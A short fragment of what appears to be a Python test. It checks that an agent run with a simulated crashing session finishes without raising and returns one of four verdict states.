    agent = Agent(Config(), session=BjCrashSession(), approve=True)
    result = agent.run("transform")  # não levanta
    assert result.verdict in ("VERIFIED", "UNVERIFIED", "STUCK", "FAILED")
